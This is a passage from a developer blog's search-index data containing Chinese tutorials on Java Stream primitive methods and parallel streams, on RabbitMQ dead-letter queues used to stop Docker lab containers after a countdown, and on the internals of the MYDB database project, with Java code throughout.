5.stream的高级用法基本数据类型优化之前用到的很多Stream的方法由于都使用了泛型。所以涉及到的参数和返回值都是引用数据类型。即使我们操作的是整教小数，但是实际用的都是他们的包装类。IDK5中引入的自动装箱和自动拆箱让我们在使用对应的包装类时就好像使用基本数据类型一样方便。但是你一定要知道装箱和拆箱肯定是要消耗时间的。虽然这个时间消耗很下。但是在大量的数据不断的重复装箱拆箱的时候，你就不能无视这个时间损耗了所以为了让我们能够对这部分的时间消耗进行优化。Stream还提供了很多专门针对基本数据类型的方法。例如: mapTolnt,mapToLong,mapToDouble,flatMapTolnt,flatMapToDouble等 authors.stream() .map(Author::getAge) .map(age -&gt; age + 10) .filter(age -&gt; age &gt; 18) .forEach(System.out::println); authors.stream() .mapToInt(Author::getAge) .map(age -&gt; age + 10) .filter(age -&gt; age &gt; 18) .forEach(System.out::println); 并行流当流中有大量元素时，我们可以使用并行流去提高操作的效率。其实并行流就是把任务分配给多个线程去完全。如果我们自己去用代码实现的话其实会非常的复杂，并且要求你对并发编程有足够的理解和认识。而如果我们使用Stream的话，我们只需要修改一个方法的调用就可以使用并行流来帮我们实现，从而提高效率。 authors.stream().parallel() .peek(new Consumer&lt;Author&gt;() &#123; @Override public void accept(Author author) &#123; System.out.println(author.getName() + Thread.currentThread().getName()); &#125; &#125;) .map(Author::getAge) .map(age -&gt; age + 10) .filter(age -&gt; age &gt; 18) .forEach(System.out::println); authors.parallelStream() .peek(new Consumer&lt;Author&gt;() &#123; @Override public void accept(Author author) &#123; System.out.println(author.getName() + Thread.currentThread().getName()); &#125; &#125;) .map(Author::getAge) .map(age -&gt; age + 10) .filter(age -&gt; age &gt; 18) .forEach(System.out::println);","tags":[{"name":"stream","slug":"stream","permalink":"https://sunzhengyu99.github.io/tags/stream/"}]},{"title":"delay_task","date":"2023-04-13T01:56:51.000Z","path":"2023/04/13/delay-task/","text":"在Springboot中使用RabbitMQ实现倒计时执行任务 死信顾名思义，就是死掉的信息，英文是Dead Letter。死信交换机（Dead-Letter-Exchange）和普通交换机没有区别，都是可以接受信息并转发到与之绑定并能路由到的队列，区别在于死信交换机是转发死信的，而和该死信交换机绑定的队列就是死信队列。说的再通俗一点，死信交换机和死信队列其实都只是普通的交换机和队列，只不过接受、转发的信息是死信，其他操作并没有区别。 1.配置RabbitMQ1.1 创建交换机交换机的存在可以将生产者发送的消息，路由到不同的queue 1.2 创建死信队列 x-message-ttl: 消息的存活时间，单位是ms x-dead-letter-exchange: 指定死信队列的交换机为之前创建的delay_exchange x-dead-letter-routing-key: 当消息过期之后转发到交换机key(k2)对应的队列queue 1.3 创建普通队列 1.4 绑定交换机和队列 1.5 代码实现以上步骤也能使用代码实现 2 springboot整合RabbitMQ2.1导入依赖&lt;!--raabbitmq客户端--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-amqp&lt;/artifactId&gt; &lt;/dependency&gt; 2.2 添加配置rabbitmq: host: 127.0.0.1 port: 5672 username: root password: 123456 virtual-host: host1 listener: type: simple simple: default-requeue-rejected: false # 消息被拒绝 acknowledge-mode: manual # 手动确认消息 2.3 创建交换机、队列并绑定第一节的实现，也可以使用代码实现 队列名、交换机名与key public class RabbitConstants &#123; public static final String DLX_EXCHANGE = &quot;delay_exchange&quot;; public static final String DLX_ROUTING_KEY = &quot;k1&quot;; public static final String DLX_QUEUE = &quot;delay_queue1&quot;; public static final String QUEUE = &quot;delay_queue2&quot;; public static final String ROUTING_KEY = &quot;k2&quot;; &#125; import com.sunzy.vulfocus.common.RabbitConstants; import org.springframework.amqp.core.*; import org.springframework.context.annotation.Bean; import java.util.HashMap; import java.util.Map; //@Configuration public class RabbitConfig &#123; /** * 死信队列 * @return &#123;@link Queue&#125; */ @Bean public Queue Queue1() &#123; Map&lt;String, Object&gt; argments = new HashMap&lt;&gt;(); argments.put(&quot;x-message-ttl&quot;, 60000);// 一分钟的延时 argments.put(&quot;x-dead-letter-exchange&quot;, RabbitConstants.DLX_EXCHANGE); argments.put(&quot;x-dead-letter-routing-key&quot;, RabbitConstants.ROUTING_KEY); return new Queue(RabbitConstants.DLX_QUEUE, true, false, false, argments); &#125; @Bean public Queue Queue2()&#123; return new Queue(RabbitConstants.QUEUE, true, false, false); &#125; /** * 交换机 * * @return &#123;@link Exchange&#125; */ @Bean public Exchange orderExchange() &#123; return new DirectExchange(RabbitConstants.DLX_EXCHANGE, true, false, null); &#125; /** * 路由键 * * @return &#123;@link Binding&#125; */ @Bean public Binding Routing() &#123; return BindingBuilder.bind(Queue2()).to(orderExchange()).with(RabbitConstants.ROUTING_KEY).noargs(); &#125; /** * 死信路由键 * * @return &#123;@link Binding&#125; */ @Bean public Binding DlxRouting() &#123; return BindingBuilder.bind(Queue1()).to(orderExchange()).with(RabbitConstants.DLX_ROUTING_KEY).noargs(); &#125; &#125; 2.4 测试代码生产者向交换机delay_exchange发送消息，并且key为k1，交换机接收消息后，会将该消息路由到delay_queue1，该消息会在死信队列中待60s后，转发到delay_queue2中 @Test void testSendAmqp() &#123; String taskId = &quot;cfdf21cd13f248d3885ec47329bbb3bf&quot;; amqpTemplate.convertAndSend(RabbitConstants.DLX_EXCHANGE, RabbitConstants.DLX_ROUTING_KEY, taskId); System.out.println(&quot;发送时间：&quot; + LocalDateTime.now()); System.out.println(&quot;send message success&quot;); &#125; 消费者这边监听delay_queue2中的消息 @RabbitListener(queues = RabbitConstants.QUEUE, ackMode = &quot;MANUAL&quot;) public void getMessage(Message message, Channel channel) throws IOException &#123; System.out.println(&quot;接收死信队列传递的消息...&quot;); System.out.println(&quot;时间：&quot; + LocalDateTime.now()); String taskId = new String(message.getBody()); System.out.println(taskId); channel.basicAck(message.getMessageProperties().getDeliveryTag(), false); &#125; 测试效果如下 从测试结果可以看出来，时间正好相差60s，已经实现了延时执行任务的操作。 3 实现倒计时关闭docker容器上面的延时消息的实现，主要服务于这个倒计时执行任务。 有了上面的实现，再实现倒计时关闭docker容器就简单很多 3.1 启动容器首先在启动容器时，如果容器启动成功，此时需要创建一个关闭容器的任务，并将关闭容器的任务发送到死信队列中。 @Async public void runContainer(String containerId, UserDTO user, String taskId, int countdown) throws Exception &#123; ContainerVul containerVul = containerService.query().eq(&quot;container_id&quot;, containerId).one(); if (containerVul == null) &#123; throw ErrorClass.ContainerNotExistsException; &#125; String dockerContainerId = null; UserUserprofile userInfo = userService.getById(user.getId()); dockerContainerId = containerVul.getDockerContainerId(); ImageInfo imageInfo = imageService.query().eq(&quot;image_id&quot;, containerVul.getImageIdId()).one(); String imageName = imageInfo.getImageName(); String imagePort = imageInfo.getImagePort(); Integer userId = userInfo.getId(); Result msg = null; /** * 创建启动任务 */ HashMap&lt;String, Object&gt; args = new HashMap&lt;&gt;(); args.put(&quot;imageName&quot;, imageName); args.put(&quot;userId&quot;, userId); args.put(&quot;imagePort&quot;, imagePort); TaskInfo taskInfo = query().eq(&quot;task_id&quot;, taskId).one(); String command = &quot;&quot;; String vulFlag = containerVul.getContainerFlag(); String containerPort = containerVul.getContainerPort(); String vulPort = &quot;&quot;; if (containerVul.getVulPort() != null) &#123; vulPort = containerVul.getVulPort(); &#125; String vulHost = containerVul.getVulHost(); Container container = null; if (!StrUtil.isBlank(dockerContainerId)) &#123; CheckResp checkResp = checkContainer(dockerContainerId); if (checkResp.isFlag()) &#123; container = checkResp.getContainer(); vulFlag = containerVul.getContainerFlag(); &#125; &#125; // 容器被删除，此时要创建一个容器 if (container == null) &#123; String[] portList = imagePort.split(&quot;,&quot;); ArrayList&lt;String&gt; randomList = new ArrayList&lt;&gt;(); HashMap&lt;String, Integer&gt; portDict = new HashMap&lt;&gt;(); for (String port : portList) &#123; String randomPort = &quot;&quot;; for (int i = 0; i &lt; 20; i++) &#123; randomPort = DockerTools.getRandomPort(); if (randomList.contains(randomPort) || containerService.query().eq(&quot;container_port&quot;, randomPort).one() != null) &#123; continue; &#125; break; &#125; if (StrUtil.isBlank(randomPort)) &#123; msg = Result.fail(&quot;端口无效&quot;); break; &#125; randomList.add(randomPort); portDict.put(port + &quot;/tcp&quot;, Integer.valueOf(randomPort)); &#125; // 端口重复无法创建 if (msg != null) &#123; taskInfo.setTaskMsg(JSON.toJSONString(msg)); taskInfo.setUpdateDate(LocalDateTime.now()); taskInfo.setTaskStatus(4); save(taskInfo); // return taskInfo.getTaskId(); &#125; // 记录端口映射 // &#123;&quot;3306&quot;: &quot;24471&quot;, &quot;80&quot;: &quot;29729&quot;&#125; // &#123;&quot;3306&quot;:&quot;22113&quot;,&quot;8080&quot;:&quot;12345&quot;&#125; vulPort = JSON.toJSONString(portDict); HashMap&lt;String, Integer&gt; vulPorts = new HashMap&lt;&gt;(); Set&lt;Map.Entry&lt;String, Integer&gt;&gt; entries = portDict.entrySet(); for (Map.Entry&lt;String, Integer&gt; entry : entries) &#123; String port = entry.getKey().split(&quot;/&quot;)[0]; Integer tmpRandomPort = entry.getValue(); vulPorts.put(port, tmpRandomPort); &#125; try &#123; // 只创建不启动 dockerContainerId = DockerTools.runContainerWithPorts(imageName, vulPorts); container = DockerTools.getContainerById(dockerContainerId); &#125; catch (Exception e) &#123; // 修改任务状态 msg = Result.build(&quot;镜像不存在&quot;, null); taskInfo.setTaskMsg(JSON.toJSONString(msg)); taskInfo.setUpdateDate(LocalDateTime.now()); taskInfo.setTaskStatus(4); save(taskInfo); throw new RuntimeException(e); &#125; vulFlag = &quot;flag&#123;&quot; + UUID.randomUUID().toString() + &quot;&#125;&quot;; if (!StrUtil.isBlank(containerVul.getContainerFlag())) &#123; vulFlag = containerVul.getContainerFlag(); &#125; command = &quot;touch /tmp/&quot; + vulFlag; vulHost = DockerTools.getLocalIp(); &#125; // 容器存在 LocalDateTime taskStartDate = LocalDateTime.now(); LocalDateTime taskEndDate = null; if (countdown &gt;= 60) &#123; taskEndDate = taskStartDate.plusSeconds(countdown); &#125; else if (countdown == 0) &#123; &#125; else &#123; countdown = SystemConstants.DOCKER_CONTAINER_TIME; taskEndDate = taskStartDate.plusSeconds(countdown); &#125; assert container != null; if (container.getState().equals(&quot;running&quot;)) &#123; HashMap&lt;String, Object&gt; data = new HashMap&lt;&gt;(); data.put(&quot;host&quot;, vulHost); data.put(&quot;port&quot;, vulPort); data.put(&quot;id&quot;, containerId); data.put(&quot;status&quot;, &quot;running&quot;); data.put(&quot;start_data&quot;, taskStartDate.toInstant(ZoneOffset.ofHours(8)).toEpochMilli()); data.put(&quot;end_data&quot;, taskEndDate != null ? taskEndDate.toInstant(ZoneOffset.ofHours(8)).toEpochMilli() : 0); LambdaQueryWrapper&lt;TaskInfo&gt; wrapper = new LambdaQueryWrapper&lt;&gt;(); wrapper.eq(true, TaskInfo::getUserId, userId); wrapper.eq(true, TaskInfo::getTaskMsg, JSON.toJSONString(data)); wrapper.eq(true, TaskInfo::getOperationType, 2); wrapper.eq(true, TaskInfo::getOperationArgs, JSON.toJSONString(args)); wrapper.eq(true, TaskInfo::getTaskEndDate, taskEndDate); wrapper.eq(true, TaskInfo::getTaskName, &quot;运行容器：&quot; + imageName); TaskInfo searchTaskInfo = getOne(wrapper); if (searchTaskInfo == null) &#123; taskInfo.setTaskId(taskId); taskInfo.setTaskStatus(3); taskInfo.setTaskMsg(JSON.toJSONString(data)); taskInfo.setOperationArgs(JSON.toJSONString(args)); taskInfo.setUpdateDate(LocalDateTime.now()); taskId = taskInfo.getTaskId(); LambdaQueryWrapper&lt;TaskInfo&gt; updateWrapperTask = new LambdaQueryWrapper&lt;&gt;(); updateWrapperTask.eq(true, TaskInfo::getTaskId, taskId); update(taskInfo, updateWrapperTask); &#125; else &#123; LambdaQueryWrapper&lt;TaskInfo&gt; removeWapper = new LambdaQueryWrapper&lt;&gt;(); removeWapper.eq(true, TaskInfo::getTaskId, taskId); remove(removeWapper); searchTaskInfo.setTaskId(taskId); searchTaskInfo.setUpdateDate(LocalDateTime.now()); searchTaskInfo.setTaskStatus(3); save(searchTaskInfo); &#125; &#125; else &#123; DockerTools.startContainer(dockerContainerId); // 写入flag msg = dockerContainerRun(container, command); if (msg != null &amp;&amp; msg.getStatus() == SystemConstants.HTTP_ERROR) &#123; try &#123; DockerTools.deleteContainer(container.getId()); &#125; catch (Exception ignored) &#123; log.info(&quot;删除容器失败！&quot;); &#125; taskInfo.setTaskStatus(4); &#125; else &#123; HashMap&lt;String, Object&gt; data = (HashMap&lt;String, Object&gt;) msg.getData(); String status = (String) data.get(&quot;status&quot;); data.put(&quot;host&quot;, vulHost); data.put(&quot;port&quot;, vulPort); data.put(&quot;id&quot;, containerId); data.put(&quot;start_data&quot;, taskStartDate.toInstant(ZoneOffset.ofHours(8)).toEpochMilli()); data.put(&quot;end_data&quot;, taskEndDate != null ? taskEndDate.toInstant(ZoneOffset.ofHours(8)).toEpochMilli() : 0); containerVul.setContainerStatus(status); containerVul.setDockerContainerId(dockerContainerId); containerVul.setVulHost(vulHost); containerVul.setVulPort(vulPort); containerVul.setContainerFlag(vulFlag); containerVul.setContainerPort(containerPort); containerVul.setCreateDate(LocalDateTime.now()); containerVul.setUserId(userId); containerVul.setIScheck(false); LambdaQueryWrapper&lt;ContainerVul&gt; updateWrapper = new LambdaQueryWrapper&lt;&gt;(); updateWrapper.eq(true, ContainerVul::getContainerId, containerVul.getContainerId()); containerService.update(containerVul, updateWrapper); taskInfo.setTaskStartDate(LocalDateTime.now()); taskInfo.setTaskEndDate(LocalDateTime.now()); taskInfo.setTaskStatus(3); &#125; taskInfo.setTaskMsg(JSON.toJSONString(msg)); taskInfo.setUpdateDate(LocalDateTime.now()); LambdaQueryWrapper&lt;TaskInfo&gt; updateWrapperTask = new LambdaQueryWrapper&lt;&gt;(); updateWrapperTask.eq(true, TaskInfo::getTaskId, taskId); update(taskInfo, updateWrapperTask); &#125; log.info(&quot;启动漏洞容器成功，任务ID：&quot; + taskId); // 创建关闭容器任务 半小时后关闭 String stopContainerTaskId = createStopContainerTask(containerVul, user); // 发送到RabbitMQ的死信队列 log.info(&quot;向死信队列发送任务id&quot;); amqpTemplate.convertAndSend(RabbitConstants.DLX_EXCHANGE, RabbitConstants.DLX_ROUTING_KEY, stopContainerTaskId); &#125; 重点代码就是，就很简单。 // 发送到RabbitMQ的死信队列 log.info(&quot;向死信队列发送任务id&quot;); amqpTemplate.convertAndSend(RabbitConstants.DLX_EXCHANGE, RabbitConstants.DLX_ROUTING_KEY, stopContainerTaskId); 3.2 关闭容器在consumer的监听器中执行关闭容器的步骤 import com.rabbitmq.client.Channel; import com.sunzy.vulfocus.common.RabbitConstants; import com.sunzy.vulfocus.service.impl.TaskInfoServiceImpl; import org.springframework.amqp.core.Message; import org.springframework.amqp.rabbit.annotation.RabbitListener; import org.springframework.context.annotation.Lazy; import org.springframework.stereotype.Component; import javax.annotation.Resource; import java.io.IOException; import java.time.LocalDateTime; @Component public class StopContainerListener &#123; @Resource @Lazy // 加这个注释，是因为在启动时，出现了Bean循环依赖的错误 private TaskInfoServiceImpl taskInfoService; @RabbitListener(queues = RabbitConstants.QUEUE, ackMode = &quot;MANUAL&quot;) public void getMessage(Message message, Channel channel) throws IOException &#123; System.out.println(&quot;接收死信队列传递的消息...&quot;); System.out.println(&quot;时间：&quot; + LocalDateTime.now()); String taskId = new String(message.getBody()); System.out.println(taskId); // taskInfoService.stopContainer(taskId); channel.basicAck(message.getMessageProperties().getDeliveryTag(), false); &#125; &#125; 一开始启动时出现报错，类似如下信息，增加@Lazy解决Bean循环依赖的错误 org.springframework.beans.factory.BeanCurrentlyInCreationException: Error creating bean with name &#x27;AService&#x27;: Bean with name &#x27;AService&#x27; has been injected into other beans [BService] in its raw version as part of a circular reference, but has eventually been wrapped. This means that said other beans do not use the final version of the bean. This is often the result of over-eager type matching - consider using &#x27;getBeanNamesForType&#x27; with the &#x27;allowEagerInit&#x27; flag turned off, for example. 完整代码在vulfocus_java","tags":[{"name":"springboot, rabbitmq","slug":"springboot-rabbitmq","permalink":"https://sunzhengyu99.github.io/tags/springboot-rabbitmq/"}]},{"title":"MYDB","date":"2023-03-25T14:01:41.000Z","path":"2023/03/25/MYDB/","text":"MYDB项目的总结花了一周从头到尾看了整个项目，在此做个总结，真是太复杂了，实在佩服作者。如果有错误，请指正。 MYDB的每个部分的作用 TM 通过维护 XID 文件来维护事务的状态，并提供接口供其他模块来查询某个事务的状态。 DM 直接管理数据库 DB 文件和日志文件。DM 的主要职责有： 分页管理 DB 文件，并进行缓存； 管理日志文件，保证在发生错误时可以根据日志进行恢复； 抽象 DB 文件为 DataItem 供上层模块使用，并提供缓存。 VM 基于两段锁协议实现了调度序列的可串行化，并实现了 MVCC 以消除读写阻塞。同时实现了两种隔离级别。 IM 实现了基于 B+ 树的索引，BTW，目前 where 只支持已索引字段。 TBM 实现了对字段和表的管理。同时，解析 SQL 语句，并根据语句操作表。 服务端执行流程1.创建对底层的tm模块TransactionManagerImpl tm= TransactionManager.create(&quot;cun/tm&quot;); 此时会创建一个tm.xid文件，所有的事务xid存放在此 2.基于tm创建dm模块DataManager dm=DataManager.create(&quot;cun/dm&quot;,1 &lt;&lt; 20,tm); DataManager创建过程中，会创建PageCache，Logger PageCache pc = PageCache.create(path, mem); Logger lg = Logger.create(path); // 此时创建了dm.db和dm.log，分别存储数据库数据 和 日志记录 DataManagerImpl dm = new DataManagerImpl(pc, lg, tm); dm.initPageOne(); //并对pageOne进行初始化 3.创建VM模块，此处要tm,dmVersionManager vm= VersionManager.newVersionManager(tm,dm); 首先会初始化缓存框架中的信息，初始化成员变量，将SUPER_XID(0)加入到活跃事务列表 public VersionManagerImpl(TransactionManager tm, DataManager dm) &#123; super(0); // 调用父类AbstractCache的构造方法 初始maxResource this.tm = tm; this.dm = dm; this.activeTransaction = new HashMap&lt;&gt;(); // 初始化 活跃事务列表，并将超级事务 就xid为0的 activeTransaction.put(TransactionManagerImpl.SUPER_XID, Transaction.newTransaction(TransactionManagerImpl.SUPER_XID, 0, null)); this.lock = new ReentrantLock(); this.lt = new LockTable(); &#125; 4.创建TM模块，此处基于VM,DMTableManager tbm=TableManager.create(&quot;cun/&quot;,vm,dm); 创建文件.tb用于存放表信息 public static TableManager create(String path, VersionManager vm, DataManager dm) &#123; Booter booter = Booter.create(path); booter.update(Parser.long2Byte(0)); return new TableManagerImpl(vm, dm, booter); &#125; 5.开启事务BeginRes br=tbm.begin(new Begin()); 6.解析SQL语句long xid=br.xid; //建立一张新表 String ss=&quot;create table students &quot; + &quot;name string,age int32 &quot; + &quot;(index name age)&quot;; byte b[]=ss.getBytes(StandardCharsets.UTF_8); Object stat = Parser.Parse(b); 可以看到，解析后会返回一个Object对象，其包含了表名，字段名，字段类型以及索引 7.执行创建表的SQL语句分为四种情况 开启一个事务sql语句为 begin 提交一个事务sql语句为 commit 回滚事务sql语句为abort 其他sql语句 CRUD MYDB执行sql时，默认是开启事务的，即一条sql语句也是需要提交事务的，也开启手动即begin，保持多个操作的原子性 Object stat = Parser.Parse(sql); if(Begin.class.isInstance(stat)) &#123; if(xid != 0) &#123; throw Error.NestedTransactionException; &#125; BeginRes r = tbm.begin((Begin)stat); xid = r.xid; return r.result; &#125; else if(Commit.class.isInstance(stat)) &#123; if(xid == 0) &#123; throw Error.NoTransactionException; &#125; byte[] res = tbm.commit(xid); xid = 0; return res; &#125; else if(Abort.class.isInstance(stat)) &#123; if(xid == 0) &#123; throw Error.NoTransactionException; &#125; byte[] res = tbm.abort(xid); xid = 0; return res; &#125; else &#123; // execute2就是执行CRUD操作的sql return execute2(stat); &#125; 创建一张表 假设execute2此时执行的是下面的sql语句 // create table students name string,age int32 (index name age) String ss=&quot;create table students &quot; + &quot;name string,age int32 &quot; + &quot;(index name age)&quot;; byte b[]=ss.getBytes(StandardCharsets.UTF_8); Object stat = Parser.Parse(b); tbm.create(xid,(Create) stat); 首先会到表的缓存查询是否存在该表名也就是第一个if语句中的代码 public byte[] create(long xid, Create create) throws Exception &#123; lock.lock(); try &#123; // 此处代码 if(tableCache.containsKey(create.tableName)) &#123; throw Error.DuplicatedTableException; &#125; Table table = Table.createTable(this, firstTableUid(), xid, create); updateFirstTableUid(table.uid); tableCache.put(create.tableName, table); if(!xidTableCache.containsKey(xid)) &#123; xidTableCache.put(xid, new ArrayList&lt;&gt;()); &#125; xidTableCache.get(xid).add(table); return (&quot;create &quot; + create.tableName).getBytes(); &#125; finally &#123; lock.unlock(); &#125; &#125; 如果存在，说明表名重复，抛出异常 如果没有，则创建一张新表 public byte[] create(long xid, Create create) throws Exception &#123; lock.lock(); try &#123; if(tableCache.containsKey(create.tableName)) &#123; throw Error.DuplicatedTableException; &#125; // 接下来解释的是这一行代码的执行过程 Table table = Table.createTable(this, firstTableUid(), xid, create); updateFirstTableUid(table.uid); tableCache.put(create.tableName, table); if(!xidTableCache.containsKey(xid)) &#123; xidTableCache.put(xid, new ArrayList&lt;&gt;()); &#125; xidTableCache.get(xid).add(table); return (&quot;create &quot; + create.tableName).getBytes(); &#125; finally &#123; lock.unlock(); &#125; &#125; 接下来将进入最核心的代码块中Table table = Table.createTable(this, firstTableUid(), xid, create); 进入Table.createTable// 创建一个新的Table对象，并根据传入的Create对象创建字段 nextUid = 0 Table tb = new Table(tbm, create.tableName, nextUid); for(int i = 0; i &lt; create.fieldName.length; i ++) &#123; String fieldName = create.fieldName[i]; String fieldType = create.fieldType[i]; boolean indexed = false; for(int j = 0; j &lt; create.index.length; j ++) &#123; if(fieldName.equals(create.index[j])) &#123; indexed = true; break; &#125; &#125; // 创建字段 tb.fields.add(Field.createField(tb, xid, fieldName, fieldType, indexed)); // 将新建的Field对象添加到Table对象的fields列表中 &#125; 在for循环中取出表的所有字段信息和类型，并判断是否为索引类型，接着创建字段信息 进入Field.createField代码逻辑typeCheck(fieldType); Field f = new Field(tb, fieldName, fieldType, 0); if(indexed) &#123; long index = BPlusTree.create(((TableManagerImpl)tb.tbm).dm); BPlusTree bt = BPlusTree.load(index, ((TableManagerImpl)tb.tbm).dm); f.index = index; f.bt = bt; &#125; f.persistSelf(xid); return f; 如果该字段是索引类型，将会为该索引创建B+树，以上参数信息如下 ![] persistSelf()最后会执行persistSelf()，将字段数据写入磁盘 private void persistSelf(long xid) throws Exception &#123; byte[] nameRaw = Parser.string2Byte(fieldName); byte[] typeRaw = Parser.string2Byte(fieldType); byte[] indexRaw = Parser.long2Byte(index); this.uid = ((TableManagerImpl)tb.tbm).vm.insert(xid, Bytes.concat(nameRaw, typeRaw, indexRaw)); &#125; 将字段名、类型以及索引值转换为byte类型，交给vm插入 进入((TableManagerImpl)tb.tbm).vm.insert逻辑public long insert(long xid, byte[] data) throws Exception &#123; lock.lock(); Transaction t = activeTransaction.get(xid); //从活跃的事务列表中取出该事务 lock.unlock(); if(t.err != null) &#123; throw t.err; &#125; // 将数据拼接成一个Entry byte[] raw = Entry.wrapEntryRaw(xid, data); // 插入DataItem的Data位置 return dm.insert(xid, raw); &#125; 该段中raw的数据如下，就是在VM模块中介绍的Entry的存储结构 进入dm.insert()执行流程byte[] raw = DataItem.wrapDataItemRaw(data); if(raw.length &gt; PageX.MAX_FREE_SPACE) &#123; throw Error.DataTooLargeException; &#125; 使用PageIndex选择合适的页面进行存储 PageInfo pi = null; for(int i = 0; i &lt; 5; i ++) &#123; pi = pIndex.select(raw.length); if (pi != null) &#123; break; &#125; else &#123; int newPgno = pc.newPage(PageX.initRaw()); pIndex.add(newPgno, PageX.MAX_FREE_SPACE); &#125; &#125; 取出page，插入insertLog，用于恢复时使用 pg = pc.getPage(pi.pgno); byte[] log = Recover.insertLog(xid, pg, raw); // 解析出log返回，log的格式如下图 logger.log(log); // 向.log文件中写入log，并更行日志文件的校验和，用于数据恢复 short offset = PageX.insert(pg, raw); // .db文件中写入真正的数据 pg.release(); return Types.addressToUid(pi.pgno, offset); finally &#123; // 将取出的pg重新插入pIndex if(pg != null) &#123; pIndex.add(pi.pgno, PageX.getFreeSpace(pg)); &#125; else &#123; pIndex.add(pi.pgno, freeSpace); &#125; &#125; ==以上代码都在dm.insert()中==log变量的存储结构如下所示最后返回插入位置的偏移量PageX.inset()的代码逻辑 public static short insert(Page pg, byte[] raw) &#123; pg.setDirty(true); // 此时该位置数据更新 所以为脏数据 short offset = getFSO(pg.getData()); // 获取空闲位置的偏移 在之后插入数据 System.arraycopy(raw, 0, pg.getData(), offset, raw.length); // 将数据拷贝到指定的内存地址 setFSO(pg.getData(), (short)(offset + raw.length)); // 更新FSO return offset; &#125; 完成上面的一系列操作后，sql的执行过程已经持久化到磁盘中。 回到tbm.create(xid,(Create) stat);`中updateFirstTableUid(table.uid); // 更新.tb文件 tableCache.put(create.tableName, table); if(!xidTableCache.containsKey(xid)) &#123; xidTableCache.put(xid, new ArrayList&lt;&gt;()); &#125; xidTableCache.get(xid).add(table); return (&quot;create &quot; + create.tableName).getBytes(); updateFirstTableUid()用于将新增表的uid更新到.tb文件中，该函数会调用Booter.update()函数，该函数在更新.tb文件时，用创建一个新文件其后缀为.bt_tmp之后，将新数据写入该文件，再将.bt文件中的内容拷贝到临时文件.bt_tmp中，准备好全部数据后，会用.bt_tmp将原来的.bt文件覆盖。如此更新数据，是为了保证更新数据的原子性。 public void update(byte[] data) &#123; File tmp = new File(path + BOOTER_TMP_SUFFIX); try &#123; tmp.createNewFile(); &#125; catch (Exception e) &#123; Panic.panic(e); &#125; if(!tmp.canRead() || !tmp.canWrite()) &#123; Panic.panic(Error.FileCannotRWException); &#125; try(FileOutputStream out = new FileOutputStream(tmp)) &#123; out.write(data); out.flush(); &#125; catch(IOException e) &#123; Panic.panic(e); &#125; try &#123; // 覆盖原文件 Files.move(tmp.toPath(), new File(path+BOOTER_SUFFIX).toPath(), StandardCopyOption.REPLACE_EXISTING); &#125; catch(IOException e) &#123; Panic.panic(e); &#125; // 返回新的File对象 file = new File(path+BOOTER_SUFFIX); if(!file.canRead() || !file.canWrite()) &#123; Panic.panic(Error.FileCannotRWException); &#125; &#125; 接着继续回到tbm.create(xid,(Create) stat)中，后面的代码相对简单。 tableCache.put(create.tableName, table); // 将创建好的表名放进 表缓存tableCache，方便下次创建表时，进行表名重复的检查 // xidTableCache 存放的是事务xid创建的table集合 if(!xidTableCache.containsKey(xid)) &#123; // 如果该事务xid 不在xidTableCache中，则将其加入 xidTableCache.put(xid, new ArrayList&lt;&gt;()); &#125; // 将创建的表名加入 xidTableCache.get(xid).add(table); return (&quot;create &quot; + create.tableName).getBytes(); // 返回此次sql语句执行的结果 8.执行插入的SQL语句ss=&quot;insert into students values xiaohong 18&quot;; b=ss.getBytes(StandardCharsets.UTF_8); stat = Parser.Parse(b); tbm.insert(xid,(Insert) stat); 解析出的sql语句tbm.insert()中的代码 @Override public byte[] insert(long xid, Insert insert) throws Exception &#123; lock.lock(); Table table = tableCache.get(insert.tableName); lock.unlock(); if(table == null) &#123; throw Error.TableNotFoundException; &#125; table.insert(xid, insert); return &quot;insert&quot;.getBytes(); &#125; 首先检查表名是否存在，不在则抛出TableNotFoundException异常如果存在，则进入table.insert(xid, insert),代码如下 public void insert(long xid, Insert insert) throws Exception &#123; Map&lt;String, Object&gt; entry = string2Entry(insert.values); byte[] raw = entry2Raw(entry); long uid = ((TableManagerImpl)tbm).vm.insert(xid, raw); for (Field field : fields) &#123; if(field.isIndexed()) &#123; field.insert(entry.get(field.fieldName), uid); &#125; &#125; &#125; 首先将SQL语句转换成一条Entry接着进入long uid = ((TableManagerImpl)tbm).vm.insert(xid, raw); @Override public long insert(long xid, byte[] data) throws Exception &#123; lock.lock(); Transaction t = activeTransaction.get(xid); lock.unlock(); if(t.err != null) &#123; throw t.err; &#125; byte[] raw = Entry.wrapEntryRaw(xid, data); return dm.insert(xid, raw); &#125; raw的数据结构如下进入dm.insert(xid, raw)，与创建表的过程一样 public long insert(long xid, byte[] data) throws Exception &#123; byte[] raw = DataItem.wrapDataItemRaw(data); if(raw.length &gt; PageX.MAX_FREE_SPACE) &#123; throw Error.DataTooLargeException; &#125; PageInfo pi = null; for(int i = 0; i &lt; 5; i ++) &#123; pi = pIndex.select(raw.length); if (pi != null) &#123; break; &#125; else &#123; int newPgno = pc.newPage(PageX.initRaw()); pIndex.add(newPgno, PageX.MAX_FREE_SPACE); &#125; &#125; if(pi == null) &#123; throw Error.DatabaseBusyException; &#125; Page pg = null; int freeSpace = 0; try &#123; pg = pc.getPage(pi.pgno); byte[] log = Recover.insertLog(xid, pg, raw); logger.log(log); short offset = PageX.insert(pg, raw); pg.release(); return Types.addressToUid(pi.pgno, offset); &#125; finally &#123; // 将取出的pg重新插入pIndex if(pg != null) &#123; pIndex.add(pi.pgno, PageX.getFreeSpace(pg)); &#125; else &#123; pIndex.add(pi.pgno, freeSpace); &#125; &#125; &#125; log的数据结构如下logger.log(log)中 public void log(byte[] data) &#123; byte[] log = wrapLog(data); ByteBuffer buf = ByteBuffer.wrap(log); lock.lock(); try &#123; fc.position(fc.size()); fc.write(buf); &#125; catch(IOException e) &#123; Panic.panic(e); &#125; finally &#123; lock.unlock(); &#125; // 添加log后需要对log文件的头部的校验和进行更新 updateXChecksum(log); &#125; log被进一步被打包成下面的结构接着将log写入到.log文件中，最后更新整个文件的校验和updateXChecksum(log)，之后回到 short offset = PageX.insert(pg, raw); pg.release(); return Types.addressToUid(pi.pgno, offset); 进入short offset = PageX.insert(pg, raw);,将raw数据写入磁盘中 public static short insert(Page pg, byte[] raw) &#123; pg.setDirty(true); // 此时该位置数据更新 所以为脏数据 short offset = getFSO(pg.getData()); // 获取空闲位置的偏移 在之后插入数据 System.arraycopy(raw, 0, pg.getData(), offset, raw.length); setFSO(pg.getData(), (short)(offset + raw.length)); return offset; &#125; 写入 磁盘后将page,放回pageIndex中 finally &#123; 